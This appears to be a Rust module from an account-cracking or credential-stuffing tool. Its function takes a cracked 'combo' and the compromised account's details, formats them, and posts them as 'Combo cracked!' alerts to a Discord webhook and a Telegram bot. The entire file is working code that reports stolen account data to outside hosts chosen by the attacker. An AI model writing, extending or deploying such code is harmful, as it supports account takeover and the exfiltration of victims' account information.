use serde_json::{json, Value};

use crate::config::get_config;


pub async fn _notify(combo_id: &str, account_info: &Value) {
    let config = &get_config().logging;
    if config.telegram_token == None && config.telegram_chatid == None && config.discord_webhook == None {
        return
    }
    
    let client = reqwest::Client::new();

    let mut desc = String::new();

    let Some(account_info) = account_info.as_object() else { return; };

    for (k, v) in account_info {
        let v = v.to_owned();
        desc += &format!("**{}:** {}\n", k.replace("-", " ").replace("_", " "), v);
    }

    if let Some(disc_webhook) = &config.discord_webhook {
        client.post(disc_webhook)
            .json(&json!({
                "embeds": [{
                    "title": "Combo cracked!",
                    "description": format!("**Combo ID:** {combo_id}\n{desc}"),
                    "color": 0x00ff00
                }]
            }))
            .send()
            .await
            .map(|resp| println!("Discord webhook response: {}", resp.status()))
            .err();
    }

    match (&config.telegram_chatid, &config.telegram_token) {
        (Some(chat_id), Some(token)) => {
            client.post(format!("https://api.telegram.org/bot{}/sendMessage", token))
                .json(&json!({
                    "chat_id": chat_id,
                    "text": format!("Combo cracked!\n\nCombo ID: {combo_id}\n{desc}")
                }))
                .send()
                .await
                .map(|resp| println!("Telegram response: {}", resp.status()))
                .err();
        },
        (_, _) => {}
    }

}